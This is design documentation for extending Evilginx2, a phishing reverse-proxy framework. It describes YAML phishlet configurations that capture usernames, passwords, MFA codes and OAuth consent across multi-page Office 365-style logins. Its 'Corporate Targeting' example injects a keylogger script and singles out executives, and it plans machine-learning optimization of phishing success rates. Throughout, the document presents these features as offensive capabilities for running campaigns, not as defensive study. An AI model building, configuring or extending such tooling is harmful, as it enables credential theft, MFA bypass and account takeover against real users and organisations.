# Advanced Phishlet Features

This document describes the Phase 3 implementation of Evilginx2 modernization: Advanced Phishlet Features. These features enable sophisticated conditional phishing campaigns, multi-page login flows, and enhanced phishlet management.

## Overview

The advanced phishlet features extend the existing YAML-based phishlet system with:

- **Conditional Phishing Logic**: Adapt phishing behavior based on user characteristics
- **Multi-Page Flow Support**: Handle complex login sequences across multiple pages
- **Phishlet Versioning**: Manage phishlet versions and repository
- **Enhanced Templating**: Dynamic content adaptation based on conditions

## Conditional Phishing Logic

### Supported Condition Types

1. **Email Domain**: Target specific email domains
2. **User Agent**: Detect mobile devices, browsers, or specific applications
3. **IP Geolocation**: Target users from specific countries or regions
4. **Custom Parameters**: Use custom logic based on URL parameters or session data
5. **Hostname**: Conditional logic based on the requested hostname
6. **Path**: Conditional logic based on the requested path

### Configuration Syntax

```yaml
conditions:
  - name: "corporate_users"
    type: "email_domain"
    values: ["company.com", "enterprise.org"]
    actions:
      - type: "template"
        value: "corporate_login"
      - type: "js_inject"
        value: "corporate_tracking.js"
  
  - name: "mobile_users"
    type: "user_agent"
    regex: "Mobile|Android|iPhone"
    actions:
      - type: "template"
        value: "mobile_login"
      - type: "redirect"
        value: "https://mobile.example.com/login"
```

### Action Types

- `template`: Use a different template for rendering
- `js_inject`: Inject specific JavaScript code
- `redirect`: Redirect to a different URL
- `sub_filter`: Apply different content filtering rules

## Multi-Page Flow Support

### Flow Configuration

Multi-page flows enable handling complex login sequences that span multiple pages:

```yaml
multi_page_flows:
  - name: "modern_oauth"
    steps:
      - path: "/oauth/authorize"
        credentials: ["username"]
        next_step: "password_step"
      - path: "/oauth/password"
        credentials: ["password"]
        next_step: "mfa_step"
        conditions:
          username_domain: "enterprise.com"
      - path: "/oauth/mfa"
        credentials: ["mfa_code"]
        next_step: "complete"
```

### Flow Step Properties

- `path`: The URL path for this step
- `credentials`: List of credential fields to capture
- `next_step`: The next step in the flow
- `conditions`: Conditional logic for step progression

### Common Flow Patterns

1. **Username → Password → MFA**
2. **OAuth Authorization Flow**
3. **Progressive Profiling**
4. **Multi-Factor Authentication**

## Phishlet Versioning

### Version Management

Phishlets now support semantic versioning:

```yaml
min_ver: '4.0.0'
name: 'example-phishlet'
version: '1.2.0'
author: 'Security Team'
```

### API Endpoints

- `GET /api/v1/phishlets/:name/versions` - List all versions
- `POST /api/v1/phishlets/:name/versions` - Create new version
- `GET /api/v1/phishlets/:name/versions/:version` - Get specific version

### Version Creation

```bash
curl -X POST http://localhost:8081/api/v1/phishlets/example/versions \
  -H "Content-Type: application/json" \
  -d '{
    "version": "1.1.0",
    "description": "Added mobile support and improved targeting"
  }'
```

## Enhanced Templating

### Template Functions

The template engine supports conditional rendering:

```html
{{if user_agent_contains "Mobile"}}
  <link rel="stylesheet" href="mobile.css">
{{end}}

{{if eq (email_domain) "company.com"}}
  <div class="corporate-branding">
    Welcome, {{custom_param "company_name"}} user!
  </div>
{{end}}
```

### Available Functions

- `user_agent_contains`: Check if user agent contains substring
- `email_domain`: Extract domain from email address
- `custom_param`: Get custom parameter value
- `if_condition`: Check if named condition is met

## API Integration

### Condition Evaluation

```bash
curl -X POST http://localhost:8081/api/v1/phishlets/example/conditions/evaluate \
  -H "Content-Type: application/json" \
  -d '{
    "user_agent": "Mozilla/5.0 (iPhone...)",
    "email": "user@company.com",
    "ip_address": "192.168.1.1",
    "hostname": "login.example.com",
    "path": "/signin"
  }'
```

### Multi-Page Flow Management

```bash
# Get flow information
curl http://localhost:8081/api/v1/phishlets/example/flows

# Update flow step
curl -X POST http://localhost:8081/api/v1/phishlets/example/flows/oauth/step \
  -H "Content-Type: application/json" \
  -d '{
    "session_id": "sess_123",
    "step_data": {
      "username": "user@company.com",
      "step_completed": "true"
    }
  }'
```

## gRPC Integration

### New gRPC Methods

The proxy service can query the C&C service for conditional logic:

```proto
service ProxyControlService {
  rpc EvaluateConditions(EvaluateConditionsRequest) returns (EvaluateConditionsResponse);
  rpc GetMultiPageFlow(GetMultiPageFlowRequest) returns (GetMultiPageFlowResponse);
  rpc UpdateFlowStep(UpdateFlowStepRequest) returns (UpdateFlowStepResponse);
}
```

### Usage in Proxy Service

```go
// Evaluate conditions for incoming request
conditionsResp, err := ps.controlClient.EvaluateConditions(ctx, &proto.EvaluateConditionsRequest{
    PhishletName: phishletName,
    UserAgent:    req.Header.Get("User-Agent"),
    IpAddress:    getClientIP(req),
    Hostname:     req.Host,
    Path:         req.URL.Path,
})

// Apply conditional actions
for _, action := range conditionsResp.Actions {
    switch action.Type {
    case "redirect":
        return ps.createRedirectResponse(req, action.Value)
    case "template":
        ps.useTemplate(action.Template)
    case "js_inject":
        ps.injectScript(action.Value)
    }
}
```

## Backward Compatibility

### Legacy Phishlet Support

Existing phishlets continue to work without modification. Advanced features are optional:

```yaml
# Legacy phishlet (still works)
min_ver: '3.0.0'
proxy_hosts:
  - {phish_sub: 'login', orig_sub: 'login', domain: 'example.com', session: true}
auth_tokens:
  - domain: '.example.com'
    keys: ['session']
credentials:
  username: {key: 'user', search: '(.*)'}
  password: {key: 'pass', search: '(.*)'}
```

### Migration Path

1. **Phase 1**: Continue using existing phishlets
2. **Phase 2**: Add conditional logic to existing phishlets
3. **Phase 3**: Implement multi-page flows for complex targets
4. **Phase 4**: Use versioning for phishlet management

## Examples

### Corporate Targeting

```yaml
conditions:
  - name: "target_company"
    type: "email_domain"
    values: ["targetcorp.com"]
    actions:
      - type: "template"
        value: "corporate_sso"
      - type: "js_inject"
        value: "advanced_keylogger.js"
  
  - name: "executives"
    type: "custom"
    values: ["role=executive"]
    actions:
      - type: "redirect"
        value: "https://executive-portal.targetcorp.com"
```

### Mobile Optimization

```yaml
conditions:
  - name: "mobile_devices"
    type: "user_agent"
    regex: "Mobile|Android|iPhone|iPad"
    actions:
      - type: "template"
        value: "mobile_responsive"
      - type: "js_inject"
        value: "mobile_touch_events.js"
```

### Geographic Targeting

```yaml
conditions:
  - name: "us_users"
    type: "ip_geo"
    values: ["US"]
    actions:
      - type: "template"
        value: "us_compliance"
  
  - name: "eu_users"
    type: "ip_geo"
    values: ["DE", "FR", "GB", "IT"]
    actions:
      - type: "template"
        value: "gdpr_compliant"
```

### Complex OAuth Flow

```yaml
multi_page_flows:
  - name: "office365_oauth"
    steps:
      - path: "/oauth2/authorize"
        credentials: ["username"]
        next_step: "password_step"
      - path: "/oauth2/password"
        credentials: ["password"]
        next_step: "mfa_step"
        conditions:
          username_domain: "company.com"
      - path: "/oauth2/mfa"
        credentials: ["mfa_code", "trust_device"]
        next_step: "consent_step"
      - path: "/oauth2/consent"
        credentials: ["consent_granted"]
        next_step: "complete"
```

## Testing

### Local Testing

```bash
# Start services
./control-server -grpc-port 8082 -api-port 8081 &
./proxy -port 8443 -control localhost:8082 &

# Test condition evaluation
curl -X POST http://localhost:8081/api/v1/phishlets/advanced-example/conditions/evaluate \
  -H "Content-Type: application/json" \
  -d '{
    "user_agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X)",
    "email": "ceo@company.com",
    "ip_address": "192.168.1.100"
  }'

# Test multi-page flow
curl http://localhost:8081/api/v1/phishlets/advanced-example/flows
```

### Integration Testing

```bash
# Test with different user agents
curl -H "User-Agent: Mozilla/5.0 (iPhone...)" https://localhost:8443/
curl -H "User-Agent: Mozilla/5.0 (Windows...)" https://localhost:8443/

# Test with different email domains
curl -X POST https://localhost:8443/login \
  -d "username=user@company.com&password=test123"
```

## Security Considerations

### Condition Evaluation

- Conditions are evaluated server-side to prevent client manipulation
- IP geolocation data is cached to improve performance
- User agent parsing is done safely to prevent injection attacks

### Flow State Management

- Flow sessions are stored securely with encryption
- Session timeouts prevent abandoned flows from consuming resources
- Flow data is validated before processing

### Template Security

- Templates are sandboxed to prevent code injection
- User input is properly escaped in templates
- Template functions have limited access to system resources

## Performance Considerations

### Condition Evaluation

- Conditions are evaluated in order of complexity (simple checks first)
- Results are cached when possible to improve performance
- Regex compilation is done once during phishlet loading

### Flow Management

- Flow sessions are stored in fast key-value storage
- Inactive flows are automatically cleaned up
- Flow state is kept minimal to reduce memory usage

## Troubleshooting

### Common Issues

1. **Condition Not Matching**
   - Check condition syntax in phishlet YAML
   - Verify user agent/email format
   - Test condition evaluation via API

2. **Flow Step Not Progressing**
   - Verify step path matches request URL
   - Check credential field names
   - Ensure next_step is correctly defined

3. **Template Not Loading**
   - Verify template name in condition action
   - Check template file exists and is readable
   - Test template rendering via API

### Debug Mode

Enable debug logging for detailed condition evaluation:

```bash
./control-server -grpc-port 8082 -api-port 8081 -debug
```

### Monitoring

Monitor condition evaluation and flow progression:

```bash
# View condition evaluation metrics
curl http://localhost:8081/api/v1/metrics/conditions

# View flow session statistics
curl http://localhost:8081/api/v1/metrics/flows
```

## Future Enhancements

### Planned Features

1. **Machine Learning Integration**: Automatic condition optimization based on success rates
2. **A/B Testing**: Split traffic between different phishlet variants
3. **Real-time Analytics**: Live dashboard for condition performance
4. **Advanced Geolocation**: City-level and ISP-based targeting
5. **Behavioral Analysis**: Conditions based on user interaction patterns

### Community Contributions

The advanced phishlet system is designed to be extensible. Community contributions are welcome for:

- New condition types
- Additional template functions
- Flow pattern libraries
- Integration with external services

## Support

For issues related to advanced phishlet features:

1. Check the troubleshooting section above
2. Review the example phishlets in `/phishlets/`
3. Test with the REST API endpoints
4. Enable debug logging for detailed information

For general Evilginx2 support, refer to the main documentation.
